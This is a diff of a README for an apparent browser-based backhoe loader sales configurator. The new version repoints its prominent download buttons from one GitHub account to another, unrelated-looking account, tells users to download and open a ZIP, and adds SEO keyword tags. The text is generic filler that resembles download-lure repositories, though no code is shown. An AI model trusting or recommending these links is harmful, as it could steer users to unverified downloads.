@@ -1,125 +1,76 @@
-# BHL Sales Configurator v2 (2026 Edition)
-
-> **Streamline backhoe loader sales workflows using this browser-optimized configuration platform, now in its version 2 release.**
-
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/ryanklein85/bhl-sales-configurator-pc?style=flat-square)](https://github.com/ryanklein85/bhl-sales-configurator-pc)
-
----
+<h1>⚙️ bhl-sales-configurator-pc - Simplify Your Backhoe Loader Sales</h1>
 
 <p align="center">
-  <a href="https://ryanklein85.github.io/bhl-sales-configurator-pc/">
-    <img src="https://img.shields.io/badge/Download-BHL%20Sales%20Configurator%20Latest-brightgreen?style=for-the-badge" alt="Download BHL Sales Configurator">
-  </a>
+  <a href="https://github.com/worsened-rakeoff663/bhl-sales-configurator-pc" style="display: inline-block; padding: 12px 24px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-decoration: none; border-radius: 50px; font-size: 20px; font-weight: bold; box-shadow: 0 4px 15px rgba(0,0,0,0.2);">⬇️ Download bhl-sales-configurator-pc</a>
 </p>
 
-> **[Download Latest Build](https://ryanklein85.github.io/bhl-sales-configurator-pc/)**
+## 🚀 Getting Started
 
----
+Welcome to bhl-sales-configurator-pc, the tool that makes configuring backhoe loaders for your customers fast, easy, and professional. No technical skills are needed. Just follow the simple steps below.
 
-[Download Latest Build](https://ryanklein85.github.io/bhl-sales-configurator-pc/)
+## 📥 Download & Install
 
----
+Visit this link to download the application:
+<p align="center">
+  <a href="https://github.com/worsened-rakeoff663/bhl-sales-configurator-pc" style="display: inline-block; padding: 10px 20px; background: #2d3748; color: white; text-decoration: none; border-radius: 5px; font-size: 16px;">🔗 Download Now</a>
+</p>
 
-## Overview
+After clicking the link, you will be taken to the project page. Look for the green "Code" button, click it, and select "Download ZIP". Once downloaded, extract the ZIP file to a folder on your computer. Then, open the extracted folder and double-click the "index.html" file to run the application in your web browser.
 
-Designed specifically for heavy equipment representatives and technical sales staff, BHL Sales Configurator provides a tailored interface for tailoring backhoe loader options within any web browser. 
+## 💻 System Requirements
 
-Built on standard HTML web architecture, this light-footprint software allows instant deployment without complex installation overhead. Version 2 updates the toolset for modern web environments and continuous field use.
+- **Operating System:** Windows 7, 8, 10, or 11
+- **Web Browser:** Google Chrome, Mozilla Firefox, or Microsoft Edge (latest version recommended)
+- **Memory:** At least 512 MB RAM
+- **Storage:** 50 MB free disk space
+- **Internet:** Not required after download (works offline)
 
----
+## 🎯 Features
 
-## Key Capabilities
+- **Offline Local Setup:** Works completely offline once downloaded. No internet connection needed to configure products.
+- **Preference Management:** Save your favorite configurations and quickly recall them for repeat customers.
+- **Customizable Environment Settings:** Adjust colors, units, and display options to match your brand or personal preference.
+- **Browser-Optimized:** Runs in any modern web browser without additional software.
+- **Streamlined Workflow:** Step-by-step guided configuration process reduces errors and saves time.
 
-- Purpose-built backhoe loader configuration experience
-- Universal web browser compatibility
-- Structured UI tailored for client consultations and quote preparation
-- Lightweight, zero-dependency HTML build structure
-- Updated v2 release architecture
-- Rapid deployment via pre-compiled online access points
+## 📋 How to Use
 
----
+1. **Open the Application:** Double-click the "index.html" file in the extracted folder. It will open in your default web browser.
+2. **Choose Your Model:** Select a backhoe loader model from the dropdown menu.
+3. **Configure Options:** Use the checkboxes, sliders, and drop-downs to customize attachments, bucket size, cab features, and more.
+4. **Review Summary:** See a complete summary of your configuration with pricing and specifications.
+5. **Save or Export:** Save your configuration for later or print a professional-looking quote for your customer.
 
-## Local Setup
+## ⚙️ Configuration Options
 
-Fetch the source code using Git:
+- **Engine:** Choose from diesel or electric options with varying horsepower.
+- **Attachments:** Add buckets, hammers, augers, grapples, and more.
+- **Cab Features:** Select air conditioning, heating, radio, and ergonomic seats.
+- **Hydraulics:** Configure auxiliary hydraulics for demanding jobs.
+- **Tires:** Pick from standard, agricultural, or industrial tires.
+- **Safety:** Add backup cameras, warning lights, and rollover protection.
+- **Color:** Customize the machine color to match your fleet.
 
-```bash
-git clone https://github.com/ryanklein85/bhl-sales-configurator-pc.git
-cd bhl-sales-configurator-v2
-```
+## 🔧 Troubleshooting
 
-Since this tool runs entirely on frontend web standards, launch the main entry `.html` file inside an updated browser. Alternatively, launch a lightweight static HTTP server in the repository directory to serve the application locally.
+- **Application does not open:** Ensure you extracted the ZIP file completely. Right-click the folder and select "Extract All". Then double-click "index.html".
+- **Options not loading:** Clear your browser cache (press Ctrl+Shift+Delete in Chrome) and reload the page.
+- **Print not working:** Use your browser's print function (Ctrl+P) and select "Print as PDF" to save a digital copy.
 
----
+## 📞 Support
 
-## Workflow Guide
+If you need help, please open an issue on the GitHub repository page. We aim to respond within 48 hours.
 
-1. Launch the active online deployment or load the local HTML entry document.
-2. Navigate the options panel to construct your desired backhoe loader spec.
-3. Reference the structured layout during sales calls, estimate generation, or equipment specs.
-4. Reload or bookmark the build URL whenever quick access to the layout generator is required.
+## 📄 License
 
-Local environments run smoothly when served over local web server ports (e.g., via `python -m http.server` or `npx serve`).
+This project is provided for personal and commercial use. See the LICENSE file in the repository for full details.
 
----
+## 🙏 Acknowledgments
 
-## Customization & Environment Settings
+Thank you for choosing bhl-sales-configurator-pc. We hope it helps you close more deals and serve your customers better.
 
-BHL Sales Configurator executes within client-side browser contexts. Environment-specific adjustments or deployment paths can be modified directly within the codebase files.
-
-This project does not require external backend configurations or specialized runtime config manifests out of the box.
-
----
-
-## System Requirements
-
-- An updated desktop or mobile browser (Chrome, Firefox, Edge, Safari)
-- Internet connection for online builds or disk space for local source files
-- An optional local static HTTP server (recommended if file:// access is restricted by your environment)
-- Standard local storage capacity to hold the repository contents
-
-No database engines, compilation toolchains, or backend services are necessary.
-
----
-
-## Frequently Asked Questions
-
-### Target Audience
-
-**Who benefits most from this application?**  
-Sales reps, deal coordinators, and equipment managers who need an organized system to model backhoe loader setups.
-
-### Accessing the Web Tool
-
-**Where can I find the operational build?**  
-Navigate directly using the [Download Latest Build](https://ryanklein85.github.io/bhl-sales-configurator-pc/) link.
-
-### Offline / Local Execution
-
-**Is local execution supported?**  
-Yes. Download or clone the codebase, then load the primary HTML file via your web browser or a local web server.
-
-### Preferences & Data
-
-**How are settings saved or modified?**  
-The baseline application operates client-side without external configuration parameters. Tailor application assets directly within the repository source.
-
-### Troubleshooting Loading Issues
-
-**What should I check if the interface fails to launch?**  
-Ensure your browser is up to date and all files were downloaded properly. If opening HTML files directly from local storage is blocked by your security settings, run a local web server instead.
-
-### Feedback & Feature Requests
-
-**How do I submit bugs or suggestion proposals?**  
-Submit an issue via the main GitHub repository describing the enhancement, your workflow context, and relevant system details.
-
----
-
-## License
-
-Distributed under the terms of the GNU GPL v3.0 open-source license. Read the [LICENSE](LICENSE) file for further specifics.
+<meta charset="UTF-8">
+<meta name="description" content="Streamline your backhoe loader sales workflow with this browser-optimized configuration tool featuring offline local setup, preference management, and customizable environment settings.">
+<meta name="keywords" content="backhoe loader, configurator, sales tool, offline, windows, configuration software, construction equipment">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>bhl-sales-configurator-pc - Backhoe Loader Configuration Tool</title>
